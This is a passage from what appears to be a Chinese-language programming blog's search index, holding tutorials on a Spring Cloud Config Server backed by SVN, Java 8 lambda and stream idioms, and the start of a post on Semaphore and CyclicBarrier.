class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.tmatesoft.svnkit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>svnkit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>新建application.yml</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">config-server</span></span><br><span class=\"line\">  <span class=\"attr\">cloud:</span></span><br><span class=\"line\">    <span class=\"attr\">config:</span></span><br><span class=\"line\">      <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">      <span class=\"attr\">server:</span></span><br><span class=\"line\">        <span class=\"attr\">svn:</span></span><br><span class=\"line\">          <span class=\"attr\">uri:</span> <span class=\"string\">http://xxxxx.com/svnuri/</span></span><br><span class=\"line\">          <span class=\"attr\">username:</span> <span class=\"string\">demo</span></span><br><span class=\"line\">          <span class=\"attr\">password:</span> <span class=\"number\">123456</span></span><br><span class=\"line\">          <span class=\"attr\">default-label:</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">profiles:</span></span><br><span class=\"line\">    <span class=\"attr\">active:</span> <span class=\"string\">subversion</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8766</span></span><br></pre></td></tr></table></figure>\n<p>在启动的main方法中新增注解**@EnableConfigServer**启动配置中心<br>建立自定义类处理svn DemoSvnRepository</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoSvnRepository</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SvnKitEnvironmentRepository</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">DemoSvnRepository</span><span class=\"params\">(ConfigurableEnvironment environment)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(environment);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> Environment <span class=\"title function_\">findOne</span><span class=\"params\">(String application, String profile, String label)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Environment</span> <span class=\"variable\">environment</span> <span class=\"operator\">=</span> <span class=\"built_in\">super</span>.findOne(application, profile, label);</span><br><span class=\"line\">        <span class=\"type\">Properties</span> <span class=\"variable\">properties</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Properties</span>();</span><br><span class=\"line\">        <span class=\"type\">PropertySource</span> <span class=\"variable\">propertySource</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PropertySource</span>(<span class=\"string\">&quot;profile&quot;</span>, properties);</span><br><span class=\"line\">        environment.add(propertySource);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">workingDirectory</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getWorkingDirectory();</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">profilePath</span> <span class=\"operator\">=</span> workingDirectory.getPath() + <span class=\"string\">&quot;/&quot;</span> + application + <span class=\"string\">&quot;/&quot;</span> + profile;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (<span class=\"type\">FileInputStream</span> <span class=\"variable\">fileInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(profilePath)) &#123;</span><br><span class=\"line\">            properties.load(fileInputStream);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> environment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>配置中心使用svn默认是先从svn下载最新配置文件，之后访问时读取本地配置文件。<br>启动服务，访问：<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY2L2JldGEveHh4eC9hcHBsaWNhdGlvbi5wcm9wZXJ0aWVz\">http://localhost:8766/beta/xxxx/application.properties<i class=\"fa fa-external-link-alt\"></i></span></p>\n<ul>\n<li>在实际访问的时候会无法访问到数据，调试后会出现异常<strong>HttpMediaTypeNotAcceptableException</strong>。</li>\n</ul>\n<p>新增WebConfigurer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">WebConfigurer</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">WebMvcConfigurerAdapter</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">configureContentNegotiation</span><span class=\"params\">(ContentNegotiationConfigurer configurer)</span> &#123;</span><br><span class=\"line\">        configurer.favorPathExtension(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>之后访问地址正常。</p>\n<h3 id=\"Spring-Cloud-Bus-消息总线\"><a href=\"#Spring-Cloud-Bus-消息总线\" class=\"headerlink\" title=\"Spring Cloud Bus 消息总线\"></a>Spring Cloud Bus 消息总线</h3><p>Spring Cloud Bus 将分布式的节点用轻量的消息代理连接起来。它可以用于广播配置文件的更改或者服务之间的通讯，也可以用于监控。</p>\n","categories":["Spring Cloud"],"tags":["Spring","Spring Cloud"]},{"title":"Java8新写法","url":"/2018/01/22/Java8%E6%96%B0%E5%86%99%E6%B3%95/","content":"<p>Jdk8 lambd新写法</p>\n<span id=\"more\"></span>\n<h3 id=\"Map-merge\"><a href=\"#Map-merge\" class=\"headerlink\" title=\"Map.merge\"></a>Map.merge</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">    Map&lt;String, Integer&gt; pageVisits = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">page</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;https://agiledeveloper.com&quot;</span>;</span><br><span class=\"line\">    incrementPageVisit(pageVisits, page);</span><br><span class=\"line\">    incrementPageVisit(pageVisits, page);</span><br><span class=\"line\">    incrementPageVisitNew(pageVisits, page);</span><br><span class=\"line\">    System.out.println(pageVisits);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 统计Map中key出现的次数</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> pageVisits</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> page</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">incrementPageVisit</span><span class=\"params\">(Map&lt;String, Integer&gt; pageVisits, String page)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!pageVisits.containsKey(page)) &#123;</span><br><span class=\"line\">        pageVisits.put(page, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    pageVisits.put(page, pageVisits.get(page) + <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 改进后写法</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> pageVisits</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> page</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">incrementPageVisitNew</span><span class=\"params\">(Map&lt;String, Integer&gt; pageVisits, String page)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * key：map传入的key</span></span><br><span class=\"line\"><span class=\"comment\">     * value：不存在的时候默认值不能为null</span></span><br><span class=\"line\"><span class=\"comment\">     * remappingFunction：表达式，查询计算值的表达式</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    pageVisits.merge(page, <span class=\"number\">1</span>, (oldValue, value) -&gt; oldValue + value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"List-Stream\"><a href=\"#List-Stream\" class=\"headerlink\" title=\"List.Stream\"></a>List.Stream</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Car</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String make;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String model;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> year;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Car</span><span class=\"params\">(String make, String model, <span class=\"type\">int</span> year)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.make = make;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.model = model;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.year = year;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getMake</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> make;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getModel</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> model;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getYear</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> year;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        List&lt;Car&gt; cars = Arrays.asList(</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Car</span>(<span class=\"string\">&quot;Jeep&quot;</span>, <span class=\"string\">&quot;Wrangler&quot;</span>, <span class=\"number\">2011</span>),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Car</span>(<span class=\"string\">&quot;Jeep&quot;</span>, <span class=\"string\">&quot;Comanche&quot;</span>, <span class=\"number\">1990</span>),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Car</span>(<span class=\"string\">&quot;Dodge&quot;</span>, <span class=\"string\">&quot;Avenger&quot;</span>, <span class=\"number\">2010</span>),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Car</span>(<span class=\"string\">&quot;Buick&quot;</span>, <span class=\"string\">&quot;Cascada&quot;</span>, <span class=\"number\">2016</span>),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Car</span>(<span class=\"string\">&quot;Ford&quot;</span>, <span class=\"string\">&quot;Focus&quot;</span>, <span class=\"number\">2012</span>),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Car</span>(<span class=\"string\">&quot;Chevrolet&quot;</span>, <span class=\"string\">&quot;Geo Metro&quot;</span>, <span class=\"number\">1992</span>)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        System.out.println(getModelsAfter2000UsingFor(cars));</span><br><span class=\"line\">        System.out.println(getModelsAfter2000UsingForNew(cars));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 获取2000年制造的汽车的名称，然后按年份进行排序</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> cars</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> List&lt;String&gt; <span class=\"title function_\">getModelsAfter2000UsingFor</span><span class=\"params\">(List&lt;Car&gt; cars)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//过滤需要的数据，在数据量特别大时，先过滤后排序较快</span></span><br><span class=\"line\">        List&lt;Car&gt; sortCar = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Car car : cars) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (car.getYear() &gt; <span class=\"number\">2000</span>)&#123;</span><br><span class=\"line\">                sortCar.add(car);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//通过实践排序</span></span><br><span class=\"line\">        sortCar.sort(<span class=\"keyword\">new</span> <span class=\"title class_\">Comparator</span>&lt;Car&gt;() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">compare</span><span class=\"params\">(Car o1, Car o2)</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> Integer.valueOf(o1.getYear()).compareTo(o2.getYear());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        List&lt;String&gt; models = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Car car : sortCar) &#123;</span><br><span class=\"line\">            models.add(car.getModel());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> models;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> List&lt;String&gt; <span class=\"title function_\">getModelsAfter2000UsingForNew</span><span class=\"params\">(List&lt;Car&gt; cars)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * filter：lambda过滤数据</span></span><br><span class=\"line\"><span class=\"comment\">         * sorted：数据排序</span></span><br><span class=\"line\"><span class=\"comment\">         * map：返回有给定的参数结果的流</span></span><br><span class=\"line\"><span class=\"comment\">         * collect：收集流的数据</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> cars.stream()</span><br><span class=\"line\">                .filter(car -&gt; car.getYear() &gt; <span class=\"number\">2000</span>)</span><br><span class=\"line\">                .sorted(Comparator.comparing(Car::getYear))</span><br><span class=\"line\">                .map(Car::getModel)</span><br><span class=\"line\">                .collect(Collectors.toList());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"for循环\"><a href=\"#for循环\" class=\"headerlink\" title=\"for循环\"></a>for循环</h3><p>循环自定次数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 循环指定次数</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> num</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">fori</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">        System.out.println(i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">foriNew</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, num).forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>循环次数包含当前值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 循环指定次数，包含当前值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> num</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">fori</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt;= num; i++) &#123;</span><br><span class=\"line\">        System.out.println(i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">foriNew</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">    IntStream.rangeClosed(<span class=\"number\">0</span>, num).forEach(System.out::println);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>跳着循环</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 循环指定次数，包含当前值</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> num</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">fori</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt;= num; i += <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%d \\t&quot;</span>, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">foriNew</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * iterate：后面lambda表示通过前面的值计算出后一个新值</span></span><br><span class=\"line\"><span class=\"comment\">     * 这里需要计算循环次数，不方便，可以采用jdk9中takeWhile</span></span><br><span class=\"line\"><span class=\"comment\">     * 逆向循环用减法</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    IntStream.iterate(<span class=\"number\">0</span>, e -&gt; e + <span class=\"number\">3</span>).limit(num/<span class=\"number\">3</span> + <span class=\"number\">1</span>).forEach(d -&gt; System.out.printf(<span class=\"string\">&quot;%d \\t&quot;</span>, d));</span><br><span class=\"line\">    System.out.println();</span><br><span class=\"line\">    IntStream.rangeClosed(<span class=\"number\">0</span>, num)</span><br><span class=\"line\">            .filter(e -&gt; e%<span class=\"number\">3</span> == <span class=\"number\">0</span>)</span><br><span class=\"line\">            .forEach(d -&gt; System.out.printf(<span class=\"string\">&quot;%d \\t&quot;</span>, d));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"函数式接口\"><a href=\"#函数式接口\" class=\"headerlink\" title=\"函数式接口\"></a>函数式接口</h3><p>可以使用lambda表达式<br>要求：</p>\n<ul>\n<li>接口</li>\n<li>只有一个抽象方法，默认方法，静态方法不算</li>\n</ul>\n<p>默认情况下只要一个抽象方法的接口都会默认为函数式，建议写<strong>FunctionalInterface</strong>注解，避免后期修改导致出错<br>如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@FunctionalInterface</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Transformer</span>&lt;T&gt;&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(T input)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        Transformer&lt;Stream&lt;String&gt;&gt; transformer = System.out::println;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"lambda表达式对象\"><a href=\"#lambda表达式对象\" class=\"headerlink\" title=\"lambda表达式对象\"></a>lambda表达式对象</h3><p>Function：带返回指的表达式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function&lt;Integer, Integer&gt; function = (Integer num) -&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (num == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num / <span class=\"number\">5</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">System.out.println(function.apply(<span class=\"number\">10</span>));</span><br></pre></td></tr></table></figure>\n<p>Consumer：不带返回值的表达式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer&lt;Integer&gt; transformer = (Integer num) -&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (num != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        System.out.println(num / <span class=\"number\">5</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">transformer.transform(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n<p>Predicate：表示输入是否符合条件，用于filter</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Predicate&lt;Integer&gt; predicate = (Integer num) -&gt; num != <span class=\"literal\">null</span> &amp;&amp; num % <span class=\"number\">5</span> == <span class=\"number\">0</span>;</span><br><span class=\"line\">System.out.println(predicate.test(<span class=\"number\">10</span>));</span><br></pre></td></tr></table></figure>\n","tags":["lambda","语法糖"]},{"title":"Java并发同步辅助类","url":"/2018/01/26/Java%E5%B9%B6%E5%8F%91%E5%90%8C%E6%AD%A5%E8%BE%85%E5%8A%A9%E7%B1%BB/","content":"<h3 id=\"Semaphore\"><a href=\"#Semaphore\" class=\"headerlink\" title=\"Semaphore\"></a>Semaphore</h3><p>Semaphore是计数信号量。Semaphore经常用于限制获取某种资源的线程数量。也就是设置一个值，只允许知道数量的线程操作。</p>\n<span id=\"more\"></span>\n<p>举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SemaphoreDemo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">semaphore</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, <span class=\"number\">5</span>).forEach((i)-&gt;&#123;</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt;&#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                    method();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;).start();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.MILLISECONDS.sleep(<span class=\"number\">500</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//默认是1</span></span><br><span class=\"line\">            semaphore.acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;%s：申请获取资源成功\\n&quot;</span>, Thread.currentThread().getName());</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">2</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            semaphore.release();</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;%s：资源释放，剩余资源 %d\\n&quot;</span>, Thread.currentThread().getName(), semaphore.availablePermits());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"CyclicBarrier\"><a href=\"#CyclicBarrier\" class=\"headerlink\" title=\"CyclicBarrier\"></a>CyclicBarrier</h3><p>同步屏障CyclicBarrier，CyclicBarrier表示一组线程在工作时，只有所有线程都达到某个点后才可以执行下一步，在最后一个线程未到达该点时，之前到达该点的线程都会被阻塞。<br>如：现在有个任务有3段，必须严格按照顺序执行，而没段任务内执行可以使用多线程加快执行速度。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title 